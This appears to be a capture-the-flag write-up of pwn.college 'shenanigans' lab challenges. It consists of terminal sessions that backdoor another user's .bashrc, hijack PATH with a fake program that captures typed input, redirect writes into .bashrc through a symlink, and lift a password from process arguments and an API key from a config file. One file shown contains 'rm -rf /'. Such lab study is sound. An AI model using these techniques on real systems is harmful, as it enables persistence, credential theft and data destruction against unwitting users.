# Bashrc Backdoor
code:
```
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{o3pTs37mFP4H708A_OAw5LyxxZx.0VMzEzNxwiMwEzNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```


# Sniffing Input
code:
```
hacker@shenanigans~sniffing-input:~$ mkdir -p /tmp/mybin
hacker@shenanigans~sniffing-input:~$ cat > /tmp/mybin/flag_checker <<'EOF'
> #!/bin/bash
> echo "Type the flag"
> read -r FLAG
> printf '%s\n' "$FLAG"
> EOF
hacker@shenanigans~sniffing-input:~$ chmod +x /tmp/mybin/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/tmp/mybin:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************pwn.college{09WdqzdIe80XHcDl-DRjeslt1Zv.0VNzEzNxwiMwEzNzEzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```


# Overshared Directories
code:
```
hacker@shenanigans~overshared-directories:~$ mkdir -p /tmp/mybin
hacker@shenanigans~overshared-directories:~$ cat > /tmp/mybin/flag_checker <<'EOF'
> #!/bin/bash
> echo "Type the flag"
> read -r FLAG
> printf '%s\n' "$FLAG"
> EOF
hacker@shenanigans~overshared-directories:~$ chmod +x /tmp/mybin/flag_checker
hacker@shenanigans~overshared-directories:~$ mv /home/zardus/.bashrc /tmp/zardus.bashrc.back
hacker@shenanigans~overshared-directories:~$ cat > /home/zardus/.bashrc <<'EOF'
> export PATH=/tmp/mybin:$PATH
> EOF
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************pwn.college{IEfDh7K67_c1fiZ6ZOUS_ZC43Fw.0FM0EzNxwiMwEzNzEzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
```


# Tricky Linking 
code:
```
hacker@shenanigans~tricky-linking:~$ ls -l /tmp/collab/evil-commands.txt
-rw-r--r-- 1 zardus zardus 9 Oct 10 18:43 /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ cat /tmp/collab/evil-commands.txt
rm -rf /
hacker@shenanigans~tricky-linking:~$ rm -f /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ tail -n 20 /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
pwn.college{gK0jgvlvpcY_J_Rrn3fJNarZpYK.0VM0EzNxwiMwEzNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```


# Sniffing Process Arguments
code:
```
hacker@shenanigans~sniffing-process-arguments:~$ ps aux | grep zardus
root         147  0.0  0.0   5204  3520 ?        S    21:08   0:00 su -c auto.sh --user zardus --pass pw_206642901 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   21:08   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_206642901
zardus       152  0.0  0.0 231708  2560 ?        S    21:08   0:00 sleep 6h
hacker       180  0.0  0.0 230696  2560 pts/0    S+   21:08   0:00 grep --color=auto zardus
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{49EryXJ27UQYbEkCjLLA72gxt1D.0FOzEzNxwiMwEzNzEzW}
```


# Snooping on Configurations
code:
```
hacker@shenanigans~snooping-on-configurations:~$ cat /home/zardus/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
FLAG_GETTER_API_KEY=sk-23961738
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-23961738
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{QshWr-a0RSn1ee47hlkI3WFnWmp.0lM0EzNxwiMwEzNzEzW}
```
